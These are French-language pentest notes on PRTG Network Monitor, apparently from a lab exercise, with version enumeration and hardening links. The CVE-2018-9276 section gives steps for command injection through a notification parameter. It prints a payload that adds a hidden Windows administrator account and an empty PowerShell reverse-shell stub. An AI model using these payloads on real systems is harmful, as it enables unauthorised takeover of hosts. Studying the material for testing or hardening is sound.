[[#EXPLOITATION]]
[[#HARDENING]]


ports par défaut 80,443 ou 8080

# ENUMERATION MANUELLE


## Identifier Version

```shell
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

## Tester default creds



---

# EXPLOITATION


## CVEs

### [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)(< 18.2.39)

Authenticated Command Injection

1. Dans PRTG -> Setup -> Account Settings -> Notifications -> Add New Notifications
2. Attribuer un nom et cocher EXECUTE PROGRAM.
3. Sous Program File, selectionner Demo exe notification - outfile.ps1
4. Dans Parametre, injecter une commande

Ajout de compte admin

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

Reverse Shell

```
test.txt;powershell -e 
```

5. Cliquer sur Save
6. Cliquer sur Test sur la notification créée 


---

# HARDENING

https://blog.paessler.com/different-layers-of-security-in-paessler-prtg
https://kb.paessler.com/en/topic/61108-what-security-features-does-prtg-include
